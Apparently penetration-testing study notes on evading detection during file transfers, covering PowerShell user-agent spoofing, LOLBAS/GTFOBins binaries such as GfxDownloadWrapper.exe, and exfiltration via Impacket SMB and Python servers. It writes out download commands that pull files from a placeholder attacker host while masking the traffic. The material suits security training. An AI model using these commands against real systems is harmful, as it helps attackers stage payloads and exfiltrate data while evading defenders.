### **Evading Detection: User Agent Spoofing**

**Scenario:** Use this technique when defenders have **blacklisted** default PowerShell User Agents or when you need to **blend in** with legitimate internal traffic (e.g., emulating the specific browser used by the organization).

#### **Operational Workflow**

1. **Identify** available User Agent strings supported by the system.
2. **Assign** the desired browser profile to a variable.
3. **Execute** the file transfer using the `-UserAgent` parameter to mask the request.

#### **Command Reference**

|Goal|Command|
|:--|:--|
|**List** available User Agents|`[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties()|
|**Download** with Chrome User Agent|`$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome` `Invoke-WebRequest http://<ATTACK_IP>/<FILENAME> -UserAgent $UserAgent -OutFile "C:\Users\Public\<FILENAME>"`|

#### **Available User Agent Profiles**

The following profiles can be emulated to appear as legitimate browser traffic:

- **InternetExplorer**
- **FireFox**
- **Chrome**
- **Opera**
- **Safari**

---

### **Living Off the Land: LOLBAS and GTFOBins**

**Scenario:** Use when **application whitelisting** blocks standard tools like PowerShell or Netcat, or when **command-line logging** is likely to alert defenders to suspicious activity.

#### **Methodology**

- **LOLBINs** (Living Off the Land Binaries) are "misplaced trust binaries" already present on the system that contain unexpected functionality, such as file downloading.
- **GTFOBins** is the Linux equivalent, providing methods to use nearly 40 commonly installed binaries for file transfers.
- **Attack Implication:** Using these binaries can bypass whitelisting and may be excluded from security alerts because the binary itself is trusted.

#### **Example: GfxDownloadWrapper.exe**

This binary (part of the Intel Graphics Driver) can be used to download files under the guise of configuration updates.

|Parameter|Description|
|:--|:--|
|**Source URL**|The remote location of the file to download (`http://<ATTACK_IP>/<FILE>`)|
|**Destination Path**|The local path where the file will be saved|

**Command:**

```
GfxDownloadWrapper.exe "http://<ATTACK_IP>/<FILENAME>" "C:\Temp\<FILENAME>"
```

---

### **Additional Transfer Techniques**

**Scenario:** Selection depends on the specific access level (e.g., web shell) and the direction of the transfer.

|Tool/Method|Context|Goal|
|:--|:--|:--|
|**Certutil**|Web shell access|Download files to the target for enumeration.|
|**Impacket SMB Server**|Exfiltration|Download files off the target to the attack host.|
|**Python Web Server**|Exfiltration|Use with upload capabilities to retrieve target files.|

**Recommendation:** Always check the **LOLBAS project** (Windows) or **GTFOBins project** (Linux) to find environment-specific binaries to accomplish file transfer goals.